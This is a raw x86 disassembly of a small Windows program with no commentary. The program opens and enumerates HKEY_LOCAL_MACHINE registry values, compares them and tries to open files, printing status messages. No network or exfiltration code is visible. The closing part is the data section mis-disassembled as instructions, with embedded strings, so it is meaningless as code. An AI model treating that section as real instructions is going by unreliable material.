





push   $0x11c
mov    $0x401d18,%eax
call   0x401c74
pushl  0xc(%ebp)
mov    0x4020ec,%esi
pushl  0x8(%ebp)
push   $0x402154
call   *%esi
add    $0xc,%esp
push   $0x1
push   $0x40
push   $0x20
pushl  0x8(%ebp)
lea    -0xa0(%ebp),%ecx
call   *0x402048
xor    %edi,%edi
mov    %edi,-0x4(%ebp)
cmp    %edi,-0x4c(%ebp)
jne    0x40106d
call   *0x40200c
push   %eax
push   $0x402168
call   *%esi
orl    $0xffffffff,-0x4(%ebp)
pop    %ecx
pop    %ecx
lea    -0xa0(%ebp),%ecx
call   *0x40204c
xor    %eax,%eax
inc    %eax
call   0x401cdd
ret    
push   $0x1
push   $0x40
push   $0x20
pushl  0xc(%ebp)
lea    -0x128(%ebp),%ecx
call   *0x402070
movb   $0x1,-0x4(%ebp)
cmp    %edi,-0xd8(%ebp)
jne    0x4010de
call   *0x40200c
push   %eax
push   $0x40218c
call   *%esi
xor    %edi,%edi
pop    %ecx
inc    %edi
pop    %ecx
lea    -0x128(%ebp),%ecx
movb   $0x0,-0x4(%ebp)
call   *0x402050
orl    $0xffffffff,-0x4(%ebp)
lea    -0xa0(%ebp),%ecx
call   *0x40204c
mov    %edi,%eax
jmp    0x401067
lea    -0xa0(%ebp),%ecx
call   *0x402068
push   %eax
lea    -0x128(%ebp),%ecx
call   *0x402060
mov    -0xa0(%ebp),%eax
mov    0x4(%eax),%eax
lea    -0xa0(%ebp,%eax,1),%eax
mov    0x8(%eax),%ecx
and    $0x6,%cl
movsbl %cl,%ecx
neg    %ecx
sbb    %ecx,%ecx
not    %ecx
test   %ecx,%eax
jne    0x4010c5
lea    -0x128(%ebp),%ecx
call   *0x402064
lea    -0xa0(%ebp),%ecx
call   *0x40206c
lea    -0x128(%ebp),%ecx
call   *0x402074
push   $0x4021b0
call   *%esi
jmp    0x4010a0
push   %ebp
mov    %esp,%ebp
sub    $0x414,%esp
mov    0x403000,%eax
xor    %ebp,%eax
mov    %eax,-0x4(%ebp)
push   %esi
mov    0x4020ec,%esi
push   %edi
push   $0x4021c4
call   *%esi
mov    0x8(%ebp),%edx
lea    -0x414(%ebp),%eax
pop    %ecx
mov    %eax,%ecx
mov    $0x208,%edi
sub    %ecx,%edx
lea    0x7ffffdf6(%edi),%ecx
test   %ecx,%ecx
je     0x401181
movzwl (%edx,%eax,1),%ecx
test   %cx,%cx
je     0x401181
mov    %cx,(%eax)
inc    %eax
inc    %eax
dec    %edi
jne    0x401166
test   %edi,%edi
jne    0x401187
dec    %eax
dec    %eax
push   %ebx
xor    %ecx,%ecx
push   $0x20019
mov    %cx,(%eax)
push   %ecx
lea    -0x414(%ebp),%eax
push   %eax
push   $0x80000002
call   *0x402004
mov    %eax,%edi
test   %edi,%edi
jne    0x4011b4
push   $0x4021d8
call   *%esi
jmp    0x4011bd
push   %edi
push   $0x4021e8
call   *%esi
pop    %ecx
pop    %ecx
mov    -0x4(%ebp),%ecx
mov    %edi,%eax
pop    %edi
xor    %ebp,%ecx
pop    %esi
call   0x40146d
leave  
ret    
push   $0x3c
mov    $0x401d3f,%eax
call   0x401ca7
mov    0x14(%ebp),%eax
mov    %ecx,%ebx
push   $0x40220c
mov    %ebx,-0x44(%ebp)
mov    %eax,-0x40(%ebp)
call   *0x4020ec
andl   $0x0,-0x3c(%ebp)
pop    %ecx
mov    $0x2000,%esi
push   %esi
call   0x40147c
pop    %ecx
mov    $0x1000,%edi
push   %esi
mov    %eax,-0x30(%ebp)
mov    %edi,0x8(%ebp)
call   0x40147c
pop    %ecx
lea    0xc(%ebp),%ecx
push   %ecx
push   %eax
mov    %eax,-0x34(%ebp)
lea    0x10(%ebp),%eax
push   %eax
push   $0x0
lea    0x8(%ebp),%eax
push   %eax
pushl  -0x30(%ebp)
mov    %edi,0xc(%ebp)
push   $0x0
push   %ebx
call   *0x402000
mov    %eax,%ebx
test   %ebx,%ebx
jne    0x401357
mov    0x4020e4,%ebx
pushl  -0x30(%ebp)
push   $0x402220
call   *0x4020e8
pushl  -0x34(%ebp)
push   $0x402234
call   *0x4020e8
pushl  0x10(%ebp)
push   $0x402248
call   *0x4020e8
add    $0x18,%esp
cmpl   $0x1,0x10(%ebp)
jne    0x40130f
push   $0x0
pushl  -0x34(%ebp)
push   $0x0
call   *%ebx
add    $0xc,%esp
inc    %eax
push   %eax
mov    %eax,-0x38(%ebp)
call   0x40147c
pop    %ecx
pushl  -0x38(%ebp)
mov    %eax,-0x30(%ebp)
pushl  -0x34(%ebp)
push   %eax
call   *%ebx
add    $0xc,%esp
pushl  -0x30(%ebp)
lea    -0x2c(%ebp),%ecx
call   *0x402054
andl   $0x0,-0x4(%ebp)
push   $0x0
push   $0x40225c
lea    -0x2c(%ebp),%ecx
call   *0x40205c
mov    0x402078,%ecx
cmp    (%ecx),%eax
je     0x401302
push   $0x0
pushl  -0x40(%ebp)
push   $0x0
call   *%ebx
add    $0xc,%esp
inc    %eax
push   %eax
mov    %eax,-0x38(%ebp)
call   0x40147c
pop    %ecx
pushl  -0x38(%ebp)
mov    %eax,-0x34(%ebp)
pushl  -0x40(%ebp)
push   %eax
call   *%ebx
add    $0xc,%esp
pushl  -0x30(%ebp)
pushl  -0x34(%ebp)
call   0x401000
pop    %ecx
pop    %ecx
test   %eax,%eax
je     0x40136f
orl    $0xffffffff,-0x4(%ebp)
lea    -0x2c(%ebp),%ecx
call   *0x402058
incl   -0x3c(%ebp)
push   %esi
call   0x40147c
pop    %ecx
push   %esi
mov    %eax,-0x30(%ebp)
mov    %edi,0x8(%ebp)
call   0x40147c
pop    %ecx
lea    0xc(%ebp),%ecx
push   %ecx
push   %eax
mov    %eax,-0x34(%ebp)
lea    0x10(%ebp),%eax
push   %eax
push   $0x0
lea    0x8(%ebp),%eax
push   %eax
pushl  -0x30(%ebp)
mov    %edi,0xc(%ebp)
pushl  -0x3c(%ebp)
pushl  -0x44(%ebp)
call   *0x402000
mov    %eax,-0x38(%ebp)
test   %eax,%eax
je     0x401244
mov    %eax,%ebx
mov    $0xea,%esi
cmp    %esi,%ebx
jne    0x401380
push   $0x402264
call   *0x4020ec
mov    %esi,%eax
jmp    0x40138f
orl    $0xffffffff,-0x4(%ebp)
lea    -0x2c(%ebp),%ecx
call   *0x402058
xor    %eax,%eax
jmp    0x401390
push   %ebx
push   $0x402278
call   *0x4020ec
pop    %ecx
mov    %ebx,%eax
pop    %ecx
call   0x401cf1
ret    
push   %ebp
mov    %esp,%ebp
and    $0xfffffff8,%esp
sub    $0xc,%esp
push   %ebx
push   %esi
push   %edi
push   $0x0
push   $0x402298
call   *0x4020ec
push   $0x2
pop    %edi
xor    %ecx,%ecx
push   $0x4
pop    %edx
mov    %edi,%eax
mul    %edx
seto   %cl
neg    %ecx
or     %eax,%ecx
push   %ecx
call   0x40147c
add    $0xc,%esp
mov    $0x208,%ebx
push   %ebx
mov    %eax,%esi
call   0x40147c
pop    %ecx
push   %ebx
mov    %eax,(%esi)
call   0x40147c
mov    %eax,0x4(%esi)
mov    (%esi),%eax
pop    %ecx
mov    $0x4022b0,%edx
movzwl (%edx),%ecx
mov    %cx,(%eax)
add    %edi,%edx
add    %edi,%eax
test   %cx,%cx
jne    0x4013ec
mov    0x4(%esi),%ecx
mov    $0x402310,%edx
movzwl (%edx),%eax
mov    %ax,(%ecx)
add    %edi,%edx
add    %edi,%ecx
test   %ax,%ax
jne    0x401403
andl   $0x0,0x10(%esp)
mov    0x10(%esp),%eax
pushl  (%esi,%eax,4)
lea    0x18(%esp),%ebx
call   0x401131
pop    %ecx
test   %eax,%eax
jne    0x40144d
mov    0x8(%ebp),%eax
pushl  (%eax)
mov    0x18(%esp),%ecx
pushl  0x18(%esp)
pushl  0x1c(%esp)
pushl  0x20(%esp)
call   0x4011ce
add    $0x10,%esp
test   %eax,%eax
je     0x401457
incl   0x10(%esp)
cmp    %edi,0x10(%esp)
jl     0x401417
pop    %edi
pop    %esi
xor    %eax,%eax
pop    %ebx
mov    %ebp,%esp
pop    %ebp
ret    
pushl  0x8(%esp)
call   0x401396
pop    %ecx
xor    %eax,%eax
ret    
cmp    0x403000,%ecx
jne    0x401477
repz ret 
jmp    0x40172e
jmp    *0x4020f0
push   $0x40196c
call   0x40192f
mov    0x40336c,%eax
movl   $0x403034,(%esp)
pushl  0x403368
mov    %eax,0x403034
push   $0x403024
push   $0x403028
push   $0x403020
call   *0x4020dc
add    $0x14,%esp
mov    %eax,0x403030
test   %eax,%eax
jge    0x4014cc
push   $0x8
call   0x401884
pop    %ecx
ret    
push   $0x10
push   $0x402450
call   0x401afc
xor    %ebx,%ebx
mov    %ebx,-0x4(%ebp)
mov    %fs:0x18,%eax
mov    0x4(%eax),%esi
mov    %ebx,-0x1c(%ebp)
mov    $0x403384,%edi
push   %ebx
push   %esi
push   %edi
call   *0x402034
cmp    %ebx,%eax
je     0x401515
cmp    %esi,%eax
jne    0x401508
xor    %esi,%esi
inc    %esi
mov    %esi,-0x1c(%ebp)
jmp    0x401518
push   $0x3e8
call   *0x402038
jmp    0x4014ef
xor    %esi,%esi
inc    %esi
mov    0x403380,%eax
cmp    %esi,%eax
jne    0x40152b
push   $0x1f
call   0x401884
pop    %ecx
jmp    0x401566
mov    0x403380,%eax
test   %eax,%eax
jne    0x401560
mov    %esi,0x403380
push   $0x402118
push   $0x40210c
call   0x401af4
pop    %ecx
pop    %ecx
test   %eax,%eax
je     0x401566
movl   $0xfffffffe,-0x4(%ebp)
mov    $0xff,%eax
jmp    0x40163d
mov    %esi,0x40303c
mov    0x403380,%eax
cmp    %esi,%eax
jne    0x40158a
push   $0x402108
push   $0x402100
call   0x401aee
pop    %ecx
pop    %ecx
movl   $0x2,0x403380

cmp    %ebx,-0x1c(%ebp)
jne    0x401597
push   %ebx
push   %edi
call   *0x40203c
cmp    %ebx,0x403390
je     0x4015b8
push   $0x403390
call   0x401a30
pop    %ecx
test   %eax,%eax
je     0x4015b8
push   %ebx
push   $0x2
push   %ebx
call   *0x403390
mov    0x403024,%eax
mov    0x4020c8,%ecx
mov    %eax,(%ecx)
pushl  0x403024
pushl  0x403028
pushl  0x403020
call   0x401460
add    $0xc,%esp
mov    %eax,0x403038
cmp    %ebx,0x40302c
jne    0x401623
push   %eax
call   *0x4020cc
mov    -0x14(%ebp),%eax
mov    (%eax),%ecx
mov    (%ecx),%ecx
mov    %ecx,-0x20(%ebp)
push   %eax
push   %ecx
call   0x401992
pop    %ecx
pop    %ecx
ret    
mov    -0x18(%ebp),%esp
mov    -0x20(%ebp),%eax
mov    %eax,0x403038
xor    %ebx,%ebx
cmp    %ebx,0x40302c
jne    0x401623
push   %eax
call   *0x4020d4
cmp    %ebx,0x40303c
jne    0x401631
call   *0x4020d8
movl   $0xfffffffe,-0x4(%ebp)
mov    0x403038,%eax
call   0x401b41
ret    
mov    $0x5a4d,%eax
cmp    %ax,0x400000
je     0x401655
xor    %eax,%eax
jmp    0x4016a2
mov    0x40003c,%eax
lea    0x400000(%eax),%eax
cmpl   $0x4550,(%eax)
jne    0x401651
movzwl 0x18(%eax),%ecx
cmp    $0x10b,%ecx
je     0x40168f
cmp    $0x20b,%ecx
jne    0x401651
cmpl   $0xe,0x84(%eax)
jbe    0x401651
xor    %ecx,%ecx
cmp    %ecx,0xf8(%eax)
jmp    0x40169d
cmpl   $0xe,0x74(%eax)
jbe    0x401651
xor    %ecx,%ecx
cmp    %ecx,0xe8(%eax)
setne  %cl
mov    %ecx,%eax
push   $0x1
mov    %eax,0x40302c
call   *0x4020a8
push   $0xffffffff
call   *0x4020ac
pop    %ecx
pop    %ecx
mov    %eax,0x403388
mov    %eax,0x40338c
call   *0x4020b0
mov    0x403374,%ecx
mov    %ecx,(%eax)
call   *0x4020b4
mov    0x403370,%ecx
mov    %ecx,(%eax)
mov    0x4020b8,%eax
mov    (%eax),%eax
mov    %eax,0x40337c
call   0x401946
call   0x401ba5
cmpl   $0x0,0x403014
jne    0x40170a
push   $0x401ba5
call   *0x4020bc
pop    %ecx
call   0x401b7a
cmpl   $0xffffffff,0x403010
jne    0x401721
push   $0xffffffff
call   *0x402094
pop    %ecx
xor    %eax,%eax
ret    
call   0x401ba8
jmp    0x4014cd
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
sub    $0x328,%esp
mov    %eax,0x403148
mov    %ecx,0x403144
mov    %edx,0x403140
mov    %ebx,0x40313c
mov    %esi,0x403138
mov    %edi,0x403134
data16 mov %ss,0x403160
data16 mov %cs,0x403154
data16 mov %ds,0x403130
data16 mov %es,0x40312c
data16 mov %fs,0x403128
data16 mov %gs,0x403124
pushf  
popl   0x403158
mov    0x0(%ebp),%eax
mov    %eax,0x40314c
mov    0x4(%ebp),%eax
mov    %eax,0x403150
lea    0x8(%ebp),%eax
mov    %eax,0x40315c
mov    -0x320(%ebp),%eax
movl   $0x10001,0x403098

mov    0x403150,%eax
mov    %eax,0x40304c
movl   $0xc0000409,0x403040

movl   $0x1,0x403044

mov    0x403000,%eax
mov    %eax,-0x328(%ebp)
mov    0x403004,%eax
mov    %eax,-0x324(%ebp)
call   *0x402020
mov    %eax,0x403090
push   $0x1
call   0x401c3e
pop    %ecx
push   $0x0
call   *0x402024
push   $0x40213c
call   *0x402028
cmpl   $0x0,0x403090
jne    0x401820
push   $0x1
call   0x401c3e
pop    %ecx
push   $0xc0000409
call   *0x40202c
push   %eax
call   *0x402030
leave  
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%eax
mov    (%eax),%eax
cmpl   $0xe06d7363,(%eax)
jne    0x401870
cmpl   $0x3,0x10(%eax)
jne    0x401870
mov    0x14(%eax),%eax
cmp    $0x19930520,%eax
je     0x40186b
cmp    $0x19930521,%eax
je     0x40186b
cmp    $0x19930522,%eax
je     0x40186b
cmp    $0x1994000,%eax
jne    0x401870
call   0x401c44
xor    %eax,%eax
pop    %ebp
ret    $0x4
push   $0x401834
call   *0x402024
xor    %eax,%eax
ret    
jmp    *0x4020e0
push   $0x14
push   $0x402470
call   0x401afc
pushl  0x40338c
mov    0x402088,%esi
call   *%esi
pop    %ecx
mov    %eax,-0x1c(%ebp)
cmp    $0xffffffff,%eax
jne    0x4018b9
pushl  0x8(%ebp)
call   *0x40208c
pop    %ecx
jmp    0x401920
push   $0x8
call   0x401c56
pop    %ecx
andl   $0x0,-0x4(%ebp)
pushl  0x40338c
call   *%esi
mov    %eax,-0x1c(%ebp)
pushl  0x403388
call   *%esi
pop    %ecx
pop    %ecx
mov    %eax,-0x20(%ebp)
lea    -0x20(%ebp),%eax
push   %eax
lea    -0x1c(%ebp),%eax
push   %eax
pushl  0x8(%ebp)
mov    0x4020ac,%esi
call   *%esi
pop    %ecx
push   %eax
call   0x401c50
mov    %eax,-0x24(%ebp)
pushl  -0x1c(%ebp)
call   *%esi
mov    %eax,0x40338c
pushl  -0x20(%ebp)
call   *%esi
add    $0x14,%esp
mov    %eax,0x403388
movl   $0xfffffffe,-0x4(%ebp)
call   0x401926
mov    -0x24(%ebp),%eax
call   0x401b41
ret    
push   $0x8
call   0x401c4a
pop    %ecx
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
pushl  0x8(%ebp)
call   0x40188a
neg    %eax
sbb    %eax,%eax
neg    %eax
pop    %ecx
dec    %eax
pop    %ebp
ret    
mov    %edi,%edi
push   %esi
mov    $0x402440,%eax
mov    $0x402440,%esi
push   %edi
mov    %eax,%edi
cmp    %esi,%eax
jae    0x401969
mov    (%edi),%eax
test   %eax,%eax
je     0x401962
call   *%eax
add    $0x4,%edi
cmp    %esi,%edi
jb     0x40195a
pop    %edi
pop    %esi
ret    
mov    %edi,%edi
push   %esi
mov    $0x402448,%eax
mov    $0x402448,%esi
push   %edi
mov    %eax,%edi
cmp    %esi,%eax
jae    0x40198f
mov    (%edi),%eax
test   %eax,%eax
je     0x401988
call   *%eax
add    $0x4,%edi
cmp    %esi,%edi
jb     0x401980
pop    %edi
pop    %esi
ret    
jmp    *0x4020d0
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%ecx
mov    $0x5a4d,%eax
cmp    %ax,(%ecx)
je     0x4019b6
xor    %eax,%eax
pop    %ebp
ret    
mov    0x3c(%ecx),%eax
add    %ecx,%eax
cmpl   $0x4550,(%eax)
jne    0x4019b2
xor    %edx,%edx
mov    $0x10b,%ecx
cmp    %cx,0x18(%eax)
sete   %dl
mov    %edx,%eax
pop    %ebp
ret    
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
mov    0x8(%ebp),%eax
mov    0x3c(%eax),%ecx
add    %eax,%ecx
movzwl 0x14(%ecx),%eax
push   %ebx
push   %esi
movzwl 0x6(%ecx),%esi
xor    %edx,%edx
push   %edi
lea    0x18(%eax,%ecx,1),%eax
test   %esi,%esi
jbe    0x401a1d
mov    0xc(%ebp),%edi
mov    0xc(%eax),%ecx
cmp    %ecx,%edi
jb     0x401a15
mov    0x8(%eax),%ebx
add    %ecx,%ebx
cmp    %ebx,%edi
jb     0x401a1f
inc    %edx
add    $0x28,%eax
cmp    %esi,%edx
jb     0x401a05
xor    %eax,%eax
pop    %edi
pop    %esi
pop    %ebx
pop    %ebp
ret    
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
int3   
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
push   $0xfffffffe
push   $0x402490
push   $0x401b55
mov    %fs:0x0,%eax
push   %eax
sub    $0x8,%esp
push   %ebx
push   %esi
push   %edi
mov    0x403000,%eax
xor    %eax,-0x8(%ebp)
xor    %ebp,%eax
push   %eax
lea    -0x10(%ebp),%eax
mov    %eax,%fs:0x0
mov    %esp,-0x18(%ebp)
movl   $0x0,-0x4(%ebp)
push   $0x400000
call   0x4019a0
add    $0x4,%esp
test   %eax,%eax
je     0x401ad2
mov    0x8(%ebp),%eax
sub    $0x400000,%eax
push   %eax
push   $0x400000
call   0x4019e0
add    $0x8,%esp
test   %eax,%eax
je     0x401ad2
mov    0x24(%eax),%eax
shr    $0x1f,%eax
not    %eax
and    $0x1,%eax
movl   $0xfffffffe,-0x4(%ebp)
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
ret    
mov    -0x14(%ebp),%eax
mov    (%eax),%ecx
mov    (%ecx),%eax
xor    %edx,%edx
cmp    $0xc0000005,%eax
sete   %dl
mov    %edx,%eax
ret    
mov    -0x18(%ebp),%esp
movl   $0xfffffffe,-0x4(%ebp)
xor    %eax,%eax
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
ret    
int3   
jmp    *0x4020c4
jmp    *0x402080
int3   
int3   
push   $0x401b55
pushl  %fs:0x0
mov    0x10(%esp),%eax
mov    %ebp,0x10(%esp)
lea    0x10(%esp),%ebp
sub    %eax,%esp
push   %ebx
push   %esi
push   %edi
mov    0x403000,%eax
xor    %eax,-0x4(%ebp)
xor    %ebp,%eax
push   %eax
mov    %esp,-0x18(%ebp)
pushl  -0x8(%ebp)
mov    -0x4(%ebp),%eax
movl   $0xfffffffe,-0x4(%ebp)
mov    %eax,-0x8(%ebp)
lea    -0x10(%ebp),%eax
mov    %eax,%fs:0x0
ret    
mov    -0x10(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
push   %ecx
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
pushl  0x14(%ebp)
pushl  0x10(%ebp)
pushl  0xc(%ebp)
pushl  0x8(%ebp)
push   $0x40146d
push   $0x403000
call   0x401c5c
add    $0x18,%esp
pop    %ebp
ret    
mov    %edi,%edi
push   %esi
push   $0x30000
push   $0x10000
xor    %esi,%esi
push   %esi
call   0x401c68
add    $0xc,%esp
test   %eax,%eax
je     0x401ba3
push   %esi
push   %esi
push   %esi
push   %esi
push   %esi
call   0x401c62
add    $0x14,%esp
pop    %esi
ret    
xor    %eax,%eax
ret    
mov    %edi,%edi
push   %ebp
mov    %esp,%ebp
sub    $0x10,%esp
mov    0x403000,%eax
andl   $0x0,-0x8(%ebp)
andl   $0x0,-0x4(%ebp)
push   %ebx
push   %edi
mov    $0xbb40e64e,%edi
mov    $0xffff0000,%ebx
cmp    %edi,%eax
je     0x401bda
test   %eax,%ebx
je     0x401bda
not    %eax
mov    %eax,0x403004
jmp    0x401c3a
push   %esi
lea    -0x8(%ebp),%eax
push   %eax
call   *0x402040
mov    -0x4(%ebp),%esi
xor    -0x8(%ebp),%esi
call   *0x402010
xor    %eax,%esi
call   *0x402014
xor    %eax,%esi
call   *0x402018
xor    %eax,%esi
lea    -0x10(%ebp),%eax
push   %eax
call   *0x40201c
mov    -0xc(%ebp),%eax
xor    -0x10(%ebp),%eax
xor    %eax,%esi
cmp    %edi,%esi
jne    0x401c20
mov    $0xbb40e64f,%esi
jmp    0x401c2b
test   %esi,%ebx
jne    0x401c2b
mov    %esi,%eax
shl    $0x10,%eax
or     %eax,%esi
mov    %esi,0x403000
not    %esi
mov    %esi,0x403004
pop    %esi
pop    %edi
pop    %ebx
leave  
ret    
jmp    *0x4020a4
jmp    *0x4020a0
jmp    *0x40209c
jmp    *0x402098
jmp    *0x402090
jmp    *0x402084
jmp    *0x4020f4
jmp    *0x4020c0
jmp    *0x4020f8
push   %eax
pushl  %fs:0x0
lea    0xc(%esp),%eax
sub    0xc(%esp),%esp
push   %ebx
push   %esi
push   %edi
mov    %ebp,(%eax)
mov    %eax,%ebp
mov    0x403000,%eax
xor    %ebp,%eax
push   %eax
pushl  -0x4(%ebp)
movl   $0xffffffff,-0x4(%ebp)
lea    -0xc(%ebp),%eax
mov    %eax,%fs:0x0
ret    
push   %eax
pushl  %fs:0x0
lea    0xc(%esp),%eax
sub    0xc(%esp),%esp
push   %ebx
push   %esi
push   %edi
mov    %ebp,(%eax)
mov    %eax,%ebp
mov    0x403000,%eax
xor    %ebp,%eax
push   %eax
mov    %eax,-0x10(%ebp)
pushl  -0x4(%ebp)
movl   $0xffffffff,-0x4(%ebp)
lea    -0xc(%ebp),%eax
mov    %eax,%fs:0x0
ret    
mov    -0xc(%ebp),%ecx
mov    %ecx,%fs:0x0
pop    %ecx
pop    %edi
pop    %edi
pop    %esi
pop    %ebx
mov    %ebp,%esp
pop    %ebp
push   %ecx
ret    
mov    -0x10(%ebp),%ecx
xor    %ebp,%ecx
call   0x40146d
jmp    0x401cdd
lea    -0xa0(%ebp),%ecx
jmp    *0x40204c
lea    -0x128(%ebp),%ecx
jmp    *0x402050
mov    0x8(%esp),%edx
lea    0xc(%edx),%eax
mov    -0x12c(%edx),%ecx
xor    %eax,%ecx
call   0x40146d
mov    $0x4024bc,%eax
jmp    0x401c6e
lea    -0x2c(%ebp),%ecx
jmp    *0x402058
mov    0x8(%esp),%edx
lea    0xc(%edx),%eax
mov    -0x4c(%edx),%ecx
xor    %eax,%ecx
call   0x40146d
mov    -0x4(%edx),%ecx
xor    %eax,%ecx
call   0x40146d
mov    $0x4024e8,%eax
jmp    0x401c6e




sahf   
add    %al,%es:(%eax)
mov    (%esi),%fs
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
jo     0x402034
add    %al,(%eax)
call   0xd2402041
sub    $0x0,%al
add    %al,%dl
sub    $0x0,%al
add    %ch,-0x6bffffd4(%eax)
sub    $0x0,%al
add    %dh,0x2c(%esi)
add    %al,(%eax)
pop    %edx
sub    $0x0,%al
add    %al,0x2c(%esi)
add    %al,(%eax)
xor    (%eax,%eax,1),%ch
add    %dl,(%esp,%ebp,1)
add    %al,(%eax)
or     $0x2c,%al
add    %al,(%eax)
imulb  (%ebx)
add    %al,(%eax)
(bad)  
sub    $0x0,%al
add    %al,(%eax)
add    %al,(%eax)
add    %cl,0x2bae0000(%ecx,%ebp,1)
add    %al,(%eax)
jb     0x40207d
add    %al,(%eax)
sub    %es:(%eax),%eax
add    %bl,%ah
sub    (%eax),%al
add    %cl,0x2a4a0000(%edx,%ebp,1)
add    %al,(%eax)
or     %ch,(%edx)
add    %al,(%eax)
int3   
sub    %eax,(%eax)
add    %cl,0x29(%esi)
add    %al,(%eax)
push   %cs
sub    %eax,(%eax)
add    %dl,%al
sub    %al,(%eax)
add    %al,0x28(%esi)
add    %al,(%eax)
add    %bl,0x27(%edx)
add    %al,(%eax)
dec    %edx
sub    %al,(%eax)
add    %bh,(%eax)
sub    %al,(%eax)
add    %ch,(%esi)
sub    %al,(%eax)
add    %ah,(%esi)
sub    %al,(%eax)
add    %ch,0x27(%eax)
add    %al,(%eax)
sbb    %ch,(%eax)
add    %al,(%eax)
push   %cs
sub    %al,(%eax)
add    %bh,%dl
daa    
add    %al,(%eax)
in     $0x27,%al
add    %al,(%eax)
shlb   %cl,(%edi)
add    %al,(%eax)
shlb   $0x0,(%edi)
add    %dh,-0x5dffffd9(%edx)
daa    
add    %al,(%eax)
xchg   %eax,%edx
daa    
add    %al,(%eax)
jle    0x4020e5
add    %al,(%eax)
jbe    0x4020ea
add    %al,(%eax)
dec    %esi
daa    
add    %al,(%eax)
inc    %eax
daa    
add    %al,(%eax)
cmp    %ah,(%edi)
add    %al,(%eax)
sub    (%edi),%ah
add    %al,(%eax)
and    (%edi),%ah
add    %al,(%eax)
sbb    %ah,(%edi)
add    %al,(%eax)
push   %es
daa    
add    %al,(%eax)
clc    
add    %al,%es:(%eax)
loopne 0x40210c
add    %al,(%eax)
(bad)  
add    %al,%es:(%eax)
int3   
add    %al,%es:(%eax)
mov    $0x64000026,%esp
sub    %al,(%eax)
add    %bl,(%eax)
sub    $0x0,%eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
(bad)  
adc    $0x40,%al
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,0x16(%ebx)
inc    %eax
add    %dh,0x18(%esi)
inc    %eax
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %ah,%ch
loopne 0x4020d4
push   %ecx
add    %al,(%eax)
add    %al,(%eax)
add    (%eax),%al
add    %al,(%eax)
jg     0x402132
add    %al,(%eax)
mov    $0x23,%al
add    %al,(%eax)
mov    $0x15,%al
add    %al,(%eax)
inc    %eax
xor    %al,0x0(%eax)
cwtl   
xor    %al,0x0(%eax)
bound  %esp,0x64(%ecx)
and    %ah,0x6c(%ecx)
insb   (%dx),%es:(%edi)
outsl  %ds:(%esi),(%dx)
arpl   %sp,0x74(%ecx)
imul   $0x6f630000,0x6e(%edi),%ebp
jo     0x4021d1
imul   $0x20732520,0x67(%esi),%ebp
je     0x4021d0
and    %ah,0xa73
add    %ah,0x72(%ebp)
jb     0x4021db
jb     0x40218e
outsl  %ds:(%esi),(%dx)
jo     0x4021d6
outsb  %ds:(%esi),(%dx)
imul   $0x6c657320,0x67(%esi),%ebp
cs cs inc %bp
jb     0x4021f1
outsl  %ds:(%esi),(%dx)
jb     0x4021a2
arpl   %bp,0x64(%edi)
cmp    %gs:0xa64,%ah
gs jb  0x402201
outsl  %ds:(%esi),(%dx)
jb     0x4021b2
outsl  %ds:(%esi),(%dx)
jo     0x4021fa
outsb  %ds:(%esi),(%dx)
imul   $0x6c657320,0x67(%esi),%ebp
data16 xor (%esi),%ch
cs inc %ebp
jb     0x402216
outsl  %ds:(%esi),(%dx)
jb     0x4021c7
arpl   %bp,0x64(%edi)
cmp    %gs:0x53000a64,%ah
gs insb (%dx),%es:(%edi)
data16 and %ah,0x6f(%ebx)
jo     0x402232
and    %dh,0x75(%ebx)
arpl   %sp,0x65(%ebx)
jae    0x402234
or     (%eax),%al
add    %ch,0x70(%edi)
outsb  %gs:(%esi),(%dx)
and    %ah,0x74(%ecx)
je     0x402232
insl   (%dx),%es:(%edi)
jo     0x402244
gs and %cl,%fs:(%edx)
add    %al,(%eax)
add    %al,(%eax)
and    %ch,0x70(%edi)
outsb  %gs:(%esi),(%dx)
and    %dh,0x75(%ebx)
arpl   %sp,0x65(%ebx)
jae    0x402258
and    %ecx,(%edx)
add    %al,0x72(%ebp)
jb     0x40225b
jb     0x40220e
dec    %edi
jo     0x402256
outsb  %ds:(%esi),(%dx)
imul   $0x79656b20,0x67(%esi),%ebp
and    %esp,(%eax)
or     0x72(%ebp),%al
jb     0x40226f
jb     0x402222
inc    %ebx
outsl  %ds:(%esi),(%dx)
fs cmp %gs:(%eax),%ah
and    $0x65000a64,%eax
outsb  %ds:(%esi),(%dx)
jne    0x40227d
gs jb  0x402274
je     0x40227e
outsb  %ds:(%esi),(%dx)
and    %dh,0x61(%bp)
insb   (%dx),%es:(%edi)
jne    0x402282
jae    0x402229
add    %cl,0x0(%esi)
popa   
add    %ch,0x0(%ebp)
add    %bh,%gs:0x73002500
add    %ah,(%eax)
add    %al,(%eax)
add    %al,(%eax)
add    %cl,(%ecx)
add    %dl,0x0(%esi)
popa   
add    %ch,0x75(%eax,%eax,1)
add    %ah,0x0(%ebp)
cmp    $0x73002500,%eax
add    %al,(%eax)
add    %cl,(%ecx)
add    %dl,0x79(%eax,%eax,1)
add    %dh,0x0(%eax)
add    %bh,%gs:0x64002500
add    %cl,(%edx)
add    %al,(%eax)
add    %ch,(%esi)
gs js  0x4022c5
add    %al,(%eax)
add    %al,(%eax)
inc    %ebp
jb     0x4022d9
outsl  %ds:(%esi),(%dx)
